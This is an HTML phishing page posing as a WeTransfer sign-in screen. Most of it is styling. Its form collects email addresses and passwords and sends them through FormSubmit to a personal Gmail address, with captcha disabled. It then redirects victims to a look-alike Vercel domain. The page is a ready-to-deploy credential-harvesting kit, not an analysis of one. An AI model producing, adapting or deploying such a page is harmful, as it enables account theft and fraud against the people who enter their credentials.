<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Wetransfer</title>

<link href="[fonts.googleapis.com](https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap)" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Poppins',sans-serif;
}

/* Layout */
body{
  background:#f4f4f4;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:24px;              /* a touch more breathing room */
}

.wrapper{
  width:100%;
  max-width:420px;           /* allow a wider layout on normal phones */
  background:#f4f4f4;
  text-align:center;
  margin:0 auto;
  padding:0 12px;            /* ensure sides don’t touch edges */
}

/* Vertical rhythm for top section */
.logo{
  margin:0 0 14px;           /* space below logo */
}
.title{
  margin:0 0 10px;           /* space below title */
}
.subtitle{
  margin:0 0 18px;           /* a bit more before inputs */
  color:#666;
}

/* Groups and inputs */
.input-group{
  margin-bottom:16px;        /* tighter default, adjusted by breakpoints */
}

.input-group input{
  width:100%;
  max-width:100%;
  padding:16px 18px;         /* balanced padding */
  border:2px solid #d9d9d9;
  border-radius:20px;
  background:#fff;
  font-size:18px;
  outline:none;
  transition:0.3s ease;
}

/* Buttons */
.btn{
  width:100%;
  padding:16px;
  border:none;
  border-radius:20px;
  background:#3567f2;
  color:#fff;
  font-size:20px;
  font-weight:500;
  cursor:pointer;
  transition:0.3s ease;
  margin-top:8px;            /* keeps button off inputs */
}

/* Typographic scales (kept), plus spacing tuning on small screens */
@media (max-width: 480px){
  .logo{ font-size:clamp(36px, 9vw, 56px); margin-bottom:12px; }
  .title{ font-size:clamp(18px, 6vw, 26px); margin-bottom:8px; }
  .subtitle{ font-size:clamp(10px, 3.2vw, 13px); margin-bottom:16px; }

  .wrapper{ padding:0 10px; }
  .input-group{ margin-bottom:14px; }
  .btn{ margin-top:10px; }
}

/* Very small devices */
@media (max-width: 320px){
  body{ padding:12px; }
  .wrapper{ padding:0 8px; }     /* don’t remove side padding entirely */
  .logo{ margin-bottom:10px; }
  .title{ margin-bottom:6px; }
  .subtitle{ margin-bottom:14px; }

  .input-group{ margin-bottom:12px; }
  .input-group input{
    padding:14px 16px;
    font-size:16px;
  }
  .btn{
    font-size:18px;
    padding:14px;
    margin-top:10px;
  }
}

/* Optional: prevent elements from sticking on super-tight heights */
@media (max-height: 560px){
  body{ align-items:flex-start; }
  .wrapper{ margin-top:24px; margin-bottom:24px; }
}



</style>
</head>
<body>

<div class="wrapper">

  <img src="logo.08he3n6vuv2qc (1).svg">
  <div class="title">Sign In</div>
  <div class="subtitle">to continue to your WeTransfer account.</div>

  <!-- ✅ FormSubmit Integration -->
  <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">


    <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
    <input type="hidden" name="_captcha" value="false">

    <div class="input-group">
      <input type="email" name="email" placeholder="Enter email" required>
    </div>

    <div class="input-group">
      <input type="password" name="password" placeholder="Type your password..." required>
    </div>

    <button type="submit" class="btn">Continue</button>
  </form>

  <div class="links">
    <a href="#">Forgot password?</a>
    <a href="#">Use a different email?</a>
  </div>

  <div class="divider"><span>or</span></div>

  <div class="bottom-text">
    Receive a <a href="#">temporary code via email</a>
  </div>

</div>

</body>
</html>
